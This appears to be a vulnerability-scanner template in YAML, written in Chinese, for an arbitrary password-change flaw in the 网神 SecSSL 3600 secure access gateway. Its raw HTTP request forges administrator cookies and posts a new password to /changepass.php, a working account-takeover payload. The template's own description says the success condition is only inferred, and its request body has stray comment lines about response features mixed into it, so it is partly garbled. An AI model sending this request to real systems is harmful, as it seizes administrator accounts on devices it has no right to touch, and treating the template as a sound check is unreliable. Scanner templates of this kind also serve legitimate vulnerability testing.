info:
  name: 网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2024
http:
- raw:
  - 'POST /changepass.php?type=2  HTTP/1.1


    Cookie: admin_id=1;


    gw_user_ticket=ffffffffffffffffffffffffffffffff;


    last_step_param={"this_name":"test","subAuthId":"1"}


    old_pass=&password=Test123!@&repassword=Test123!@


    # 响应代码特征

    -1


    # 响应内容特征

    暂无


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
